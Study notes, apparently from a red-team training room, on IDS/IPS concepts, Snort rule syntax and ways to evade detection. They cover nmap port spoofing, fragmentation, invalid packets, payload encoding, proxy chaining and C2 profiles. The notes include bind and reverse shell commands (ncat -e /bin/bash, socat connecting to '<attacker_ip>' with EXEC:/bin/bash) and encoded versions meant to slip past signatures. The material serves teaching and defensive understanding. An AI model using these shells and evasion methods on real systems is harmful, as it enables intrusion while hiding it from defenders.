---
title: "Network Security Solutions"
date: 2026-10-20
weight: 16
---
## 1. Introduction
- An Intrusion Detection System (IDS) is a system that detects network or system instrusions. 
- One analogy that comes to mind is a guard watching live feeds from different security cameras. He can spot a theft, but he cant stop it by himself.However, if this guard can contact another guard and ask them to stop the robber, detection turns into prevention. 
- An Intrusion Detection and Prevention System (IDPS) or simply Intrusion Prevention System (IPS) is a system that detects and prevents intrusions.
- Understanding the difference between detection and prevention is essential. Snort is a network intrusion detection and intrusion prevention system, consequently, this can be set up as an IDS and IPS. For Snort to function as an IPS, it needs some mechanism to block the offending connections, this capability requires snort to set up as inline and to bridge two or more network cards.
- As signature based network IDS, Snort configured as IDS
![Snort IDS](/resources_redteam/snort_ids.png)
- Snort can be configured as an IPS if set up inline with network cards
![Snort IPS](/resources_redteam/snort_ips.png)


## 2. IDS Engine Types
- We can classify network traffic into:
    - Benign traffic: Legitimate network traffic, and dont want IDS to flag them as malicious
    - Malicious traffic: Network traffic that is considered malicious, and want IDS to flag them as malicious
- In the same way that we can classify network traffic, we can also classify host activity. IDS detection engine is either built around detecting malicious traffic and activity or around recognizing normal traffic and activity. Recognizing the "normal" makes it easy to detect any deviation from normal.
- Consequently the detection engine of an IDS can be:
    - Signature-based: It requires full knowledge of malicious traffic, in other words, we need to explicitly feed the signature-based detection engine the characteristics of malicious traffic. Teaching the IDS about malicious traffic can be achieved using explit rules to match against.
    - Anomaly-based: It requires the IDS to have knowledge of what regular traffic looks like, in other words, we need to "teach" the IDS what normal is so that it can recognize what is not normal. Teaching the IDS about normal traffi, i.e., baseline traffic can be achieved using machine learning or manual rules.

- Putting it another way, signature-based IDS recognizes malicious traffic, so everything that is not malicious is considered as benign. This approach is commonly found in anti-malware software, which has a database of known virus signatures. Anything that matches signature is dected as a virus.
- An anomoly-based IDS recognizes normal traffic, so everything that deviates from normal is considered is malicious. This approach is more similar to how human beings perceive things; you have certain expectations for speed, performance, and responsiveness when you start your web browser, in other words, you know what "normal" is for you web browser. If suddenly you notice that your web browser is too sluggish or unresponsive, you will know that something is wrong. In other words, you knew it when your web browser's performance deviated from your normal.   



## 3 IDS/IPS Triggering
- Each IDS/IPS has a certain syntax to write its rules. for example, snort uses following formt for its rules: ```Rule Header   (Rule Options)```, where Rule Header constitues
    - Action: Examples of action include `alert`, `log`, `pass`, `activate`, `dynamic`, `drop`, `reject`, `sdrop`
    - Protocol: `TCP`, `UDP`, `ICMP`, `IP`
    - Source IP/Source Port: `any`, `192.168.1.1`, `192.168.1.0/24`, `!192.168.1.1`, `!192.168.1.0/24`
    - Direction Flow: `-> (source to destination)`, `<-> (bidirectional)`, `<> (any direction)`
    - Destination IP/Destination Port: `any`, `192.168.1.1`, `192.168.1.0/24`, `!192.168.1.1`, `!192.168.1.0/24`

- Below is an example rule to `drop` all ICMP traffic passing through SNORT IPS:
```sh
drop icmp any any -> any any (msg:"ICMP Ping Scan"; dsize:0; sid:1000020; rev:1;)
#The rule above instructs the Snort IPS to drop all ICMP traffic with no data (dsize:0) from any source to any destination.
```
- Lets consider a hypothetical case where a vulnerability is discored in our web server. This vulnerability lies in how our web server handles HTTP POST method requests, allowing the attacker to run system commands.
- Thinking of following "naive" approach. We want to create snor rule that detects the term "ncat" in the payload of traffic exchanged with our webserver to learn how people exploit this vulnerability.
```sh
alert tcp any any -> any 80 (msg:"NetCat exploitation"; content:"ncat"; sid:1000030; rev:1;)
# rule above inspects the contect of the packet exchanged with port 80 for the string "ncat" in ASCII is written as `6e 63 61 74` in hexadecimal and it is encapsulated as string by 2 pipe characters `|`.
alert tcp any any <> any 80 (msg:"NetCat exploitation"; content:"|6e 63 61 74|"; sid:1000031; rev:1;)
# we can further refine it if we expect to see it in the HTTP POST requests. 
# Note that flow:established tell the Snort engine to look at streams started by a TCP 3-way handshake.
alert tcp any any <> any 80 (msg:"NetCat exploitation"; content:"|6e 63 61 74|"; flow:established,to_server; content:"POST"; nocase; http_method; content:"ncat"; nocase; sid:1000032; rev:1;)
```

- These are few points to make about signature based IDS and its rules. If the attacker made even the slightest changes using `ncat` verbatim in their payload, the attack would go unnoticed. As we can conclude, a signature based IDS or IPS is limited to how well-written and updated its signatures are.

## 4. Evasion via Protocol Manipulation
- Evading a signature-based IDS/IPS requires that you manipulate your traffic so that it does not match any IDS/IPS signatures. Here are four general approaches you might consider to evade IDS/IPS systems.
    - Evasion via Protocol Manipulation
    - Evasion via Payload Manipulation
    - Evasion via Route Manipulation
    - Evasion via Tactical Denial of Service (DoS)
- This room focuses on evasion using `nmap` and `ncat/socat`. The evasion techniques related to Nmap are discussed in great detail in the Firewall room. This room will emphasize the use of `ncat/socat` for evasion where appropriate.
- We will expand on each of these approaches in its own task. Let's start with the first one. Evasion protocal manipulation includes:
    - Relying on different protocol
    - Manipulating (source) TCP/UDP port
    - Using session splicing (IP packet fragmentation)
    - Sending invalid packets

### 4.1 Rely on a different protocol
- The IDS/IPS system might be configured to block certain protocols and allows others. for instance, you might consider using UDP instead of TCP or rely on HTTP instead of DNS to deliver an attack or exfiltrate data. You can use the knowledge you have gathered about the target and applications necessary for the target organization to design your attack.
- For instance, if web browsing is allowed, it usually means that protected hosts can connect to ports 80 and 443 unless a local proxy is used. In one case, the client relied on google services for their bussiness, so the attacker used google we hosting to concela his malicious site. Unfortunately, it is not a one-size-fills-all; morever, some trial and error might be necessary as long as you dont creater too much noise.
- We have an IPS set to block DNS queries and HTTP requests in the figure below. In particular, it enforces the policy where local machies cant query external DNS servers but should instead query local DNS server, morever it enforces secure HTTPS communications. It is relatively permissive when it comes to HTTPS. In this case using HTTPS to tunnel traffic looks like a prominssin approach to evade IPS.
![IPS envasion](/resources_redteam/ips_envasion.png)
- Consider the case where you are usig `ncat`, by default it uses tcp-connection, however you cn get it to use UDP using the option `-u`.
    - To listen using UPD, just use `ncat -ulvnp <PORT>`
    - To connect to an Ncat instance listening on udp-port, you can issue `ncat -u <target_ip> <target_port>`


### 4.2 Manipulate (source) TCP/UDP port
- Generally speaking, TCP/UDP source and destination ports are inspected even by most basic security solutions. Without deep packet inspection, the port numbers are primary indicator of the serive used.
- Depending on target security solution, you can make port scanning traffic resemble web browsing or DNS queries. If its nmap, we can add option `--soure-port <port>` to make nmap send all its traffic from a specifc source port number.
- While scannng a target, use `nmap -sS -Pn -g 80 -F <target_ip>` to m ake the port scanning traffic appear to be exached with an HTTP server at first glance.
- if you are interestd in scanning UDP ports, you can use `nmap -sU -Pn -g 53 -F <target_ip>` to make the traffic appear to be exached with a dns server.

### 4.3 Use session splicing (ip packet fragmentaion)
- Another approach possible in ipv4 is `ip pocket fragmentation`. The assumption is that if you break the packets related to an attack into small packets, you will avoid matching IDS signatures. If the IDS looking for particular stream of bytes to detect the malicious payload, divide your payload among multiple packets. Unless the IDS resembles the packets, the rule wont be triggered.
- Nmap offers few options to fragment packets.
    - `-f` to set the data in the IP packet to 8byts.
    - `-ff` to limit the data in the IP packet to 16 bytes.
    - `--mtu <size>` to provide a custom size for data carried within IP packet. The size should be a multiple of 8.

- Suppose you want to force all your packets to be fragmented into specific sizes. in that case you should consider using program such as [Fragroute](https://www.monkey.org/~dugsong/fragroute/). Fragroute can be set read a set of rules from a given configuration file and applies them to incoming packets. For simple IP packet fragmentation, it would be enough to use a configuration file with `ip_frag <size>` to fragment the IP data according to the provided size. The size should be a multiple of 8.

- For example, you can create a configuration file `fragroute.conf` with one line, `ip_frag 16`, to fragment packets where IP data fragments dont exceed 16 bytes. Then you would run the command `fragroute -f fragroute.conf <host>`. The host is the destination to which we would send the fragmented packets to it.

### 4.4 Sending Invalid packets.
- Generallly speaking, the response of systems to valid tends to predictable. However it can be unclear how systems would respond to invalid packets. For instance, an IDS/IPS might access an invalid packet, while target system might ignore it. The exact same behaviur would require some experimentation or inside knowledge.
- Nmap makes it possible to create invalid packets in variety of ways. two common options would be to scan the target using packets that have:
    - Invalid TCP/UDP checksum
    - Invalid TCP flags.
- Nmap lets you send packets with a wrong TCP/UDP checksum using the option `--badsum`. An incorrect checksum indicates that the original packet has been altered somehwere across its patch from the sending program.
- Nmap also lets you send packets with custom TCP flags, including invalid ones, `--scanflags` lets you choose which flags you want to set
    - `URG` for urgent
    - `ACK` fro acknowledge
    - `PSH` for push
    - `RST` for reset
    - `SYN` for synchronize
    - `FIN` for finish
- For instance, if you want to set the flags synchronize, reset, and finsih simultaneosly, you can use `--scanflags SYNRSTFIN`, although this combination might not be beneficial for your purposes.
- If you want to craft your packets with cutom fields, whether valid or invalid, you migth want to consider a tool such as `hping3`. We will list few examples options to give you anidea of packet crafting using `hping3`.
    - `-t` or `--ttl` to set the time to live in the IP header
    - `-b` or `--badsum` to send the packets with bad TCP/UDP checksum
    - `-S`, `-A`, `-P`, `-U`, `-F`, `-R` to set the TCP SYN, ACK, PUSH, URG, FIN and RST flags respectively.
- There is a myriad of other options. Depending upon needs, you migth want to check the `hping3` manual page for the complete list.


## 5. Evasion via Payload Manipulation
- Evasion via payload manipulation includes
    - Obfuscating and encoding payload
    - Encrypting the communication channel
    - Modyfying the shellcode

### 5.1 Obfuscate and Encode the payload
- Because the IDS rules are very specific, you can make minor changes to avoid detection. The changes include adding extra bytes, obfuscating the attack data, and encrypting the communication.
- Consider the command `ncat -lvnp 1234 -e /bin/bash`, where ncat will listen on TCP port 1234 and connect any incoming connection to the bash shell. There are few common transformations such as Base64, url encoding, and unicode escappe sequence that you can apply to your command to avoid triggering IDS/IPS signatures.
- **Encode to base64 format**:
    - You can use one of many online tools that encode your input to base64. Alternatively, you can use `base64` commonly found in the linux systems.
- **URL encoding**
    - URL encoding converts certain characters to form %HH, where HH is hexadecimal ASCII representation. English letters, period, dash, and underscore are not unaffected. 
    - One utility that you can easily install on linux, is `urlencode` with `apt install gridsite-clients`, alternatively you can either use an online service. 
- **Use escaped unicode**
    - Some applications will still process your input end excute it properly if you use escaped unicode. there are multiple ways to use escaped unicode depending upon the system processing the input string. 
    - For example, `Cyberchef` to select and configure the Escape Unicode Characters recipe.
    - if you use the format \u4 of prefix and padding, then `ncat -lvnp 1234 -e /bin/bash` becomes `\u006e\u0063\u0061\u0074\u0020\u002d\u006c\u0076\u006e\u0070\u0020\u0031\u0032\u0033\u0034\u0020\u002d\u0065\u0020\u002f\u0062\u0069\u006e\u002f\u0062\u0061\u0073\u0068`. 
    - It is clearly a drastic transformation that would help you evade detection, assuming the target system will interpret it correctly and execute it.

### 5.2 Encrypt the communication channel
- Because an IDS/IPS cant inspect encrypt data, an attacker can take advantage of encryption to evade detection. Unlike encoding, encryption requires an encryption key.
- One direct approach is to create necessary encryption key on the attack's system and set `socat` to use encryption key to enforce encryption as it listens for incoming connections. As encrypted reverse shell can be carried out in the 3 steps:
    - Create the key
    - Listen on the attacker's machine
    - Connect to the attacker' machine
- Firstly, on the attacker machine, we can create the key using `openssl`
```bash
openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=REd Team THM/C=UK' -nodes -keyout thm-reverse.key -out them-reverse.crt
# above command returns thm-reverse.key and thm-reverse.crt
```

- The privacy enhanced mail (PEM) (.pem) file requires the concatenation of private key and certifcate. We cn use cat to create our PEM file from the two files.
```bash
cat thm-reverse.key thm-reverse.crt > thm-reverse.pem
```
- With the PEM file ready, we can start listening while using the key for encrypting the communication with the client.
```bash
socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT`
# -d -d provides some debugging..
# OPENSSL-LISTEN:4443 indicates the connection will encrypted using teh openssl
# fork creats a sub process to handle the each new connection
```
- On victim system, `socat OPENSSL:<attacker_ip>:4443,verify=0 EXEC:/bin/bash`.
- However, if the IDS/IPS inspect the traffic, all the packet data will be encrypted. In other words, the IPS will be completely obvious to exchange the traffic commands such as `cat /etc/passwd`. 
- As you can see, it is not possible to make sense of the command or data being exchanged. To better see the value of the added layer of encryption, we will compare this with the equivalent `socat` connection that does not use encryption..
    - `socat -d -d TCP-LISTEN:4443,fork STDOUT`
    - `socat TCP:<attacker_ip>:4443 EXEC:/bin/bash`
    - Back on attakcer system, we type `cat /etc/passwd` and hit enter..
- Because no encryption was used, caputring the traffic exchanged between two systems will exposte the cmmands and traffic exchanged.
- Further more, it is trivial task to follow the TCP stream as it is in clear text and learn everything exchanged between thte attacker and target system.

### 5.3 Modify the data
- Consider the simple case where you want to use `Ncat` to create the bind shell. The following command `ncat -lvnp 1234 -e /bin/bash` tells ncat to listen on TCP port 1234 and bind bash shell to it.  If you want to detect packets containing such commands, you need to think of something specific to match the signature but not too specific.
    - Scanning for `ncat -lvnp` can easily evaded by changing the order of the flags.
    - On the other hand, inspecting the payload for `ncat -` can be evaded by adding an extra white space, such as `ncat  -` which would still run correctly on the target system.
    - If the IDS is looking for ncat, then simple changes to the original command wont evade detection. We need to consider more sophisticated approaches depending upon target system/applications. One option would be to  use a differnt command such as `nc` or `socat`.Alternatively, you can consider endcodign if the target system can process it properly.



## 6 Evasion via Route Manupulation
### 6.1 Relying on Source Routing
- In many cases, you can use source routing to force the packets to use a certain route to reach their destination. Nmap provides this feature using the option --ip-options. Nmap offers loose and strict routing:
    - Loose routing can be specified using L. For instance, --ip-options "L 10.10.10.50 10.10.50.250" requests that your scan packets are routed through the two provided IP addresses.
    - Strict routing can be specified using S. Strict routing requires you to set every hop between your system and the target host. For instance, --ip-options "S 10.10.10.1 10.10.20.2 10.10.30.3" specifies that the packets go via these three hops before reaching the target host.

### 6.2 Using Proxy Servers
- The use of proxy servers can help hide your source. Nmap offers the option --proxies that takes a list of a comma-separated list of proxy URLs. Each URL should be expressed in the format proto://host:port. Valid protocols are HTTP and SOCKS4; moreover, authentication is not currently supported.
- Consider the following example. Instead of running nmap -sS MACHINE_IP, you would edit your Nmap command to something like nmap -sS HTTP://PROXY_HOST1:8080,SOCKS4://PROXY_HOST2:4153 MACHINE_IP. This way, you would make your scan go through HTTP proxy host1, then SOCKS4 proxy host2, before reaching your target. It is important to note that finding a reliable proxy requires some trial and error before you can rely on it to hide your Nmap scan source.
- If you use your web browser to connect to the target, it would be a simple task to pass your traffic via a proxy server. Other network tools usually provide their own proxy settings that you can use to hide your traffic source.


## 7. Evasion via Tactical DoS
- Launching DoS Against IDS/IPS
- Launching DoS against the logging server


## 8. C2 and IDS/IPS Evasion
- Pentesting frameworks, such as Cobalt Strike and Empire, offer malleable Command and Control (C2) profiles. These profiles allow various fine-tuning to evade IDS/IPS systems. 
- If you are using such a framework, it is worth creating a custom profile instead of relying on a default one. Examples variables you can control include the following:
    - User Agent
    - Sleep Time for agent callback
    - Jitter for randomness to the sleeptime
    - authentic SSL Certificate, signicantly improve the chance of evading detection.
    - DNS Beacon, Use DNS protocal to exfiltrate data.

## 9. Next-Gen Security
- Next-Generation Network IPS (NGNIPS) has the following five characteristics according to Gartner:

    - Standard first-generation IPS capabilities: A next-generation network IPS should achieve what a traditional network IPS can do.
    - Application awareness and full-stack visibility: Identify traffic from various applications and enforce the network security policy. An NGNIPS must be able to understand up to the application layer.
    - Context-awareness: Use information from sources outside of the IPS to aid in blocking decisions.    
    - Content awareness: Able to inspect and classify files, such as executable programs and documents, in inbound and outbound traffic.
    - Agile engine: Support upgrade paths to benefit from new information needs.













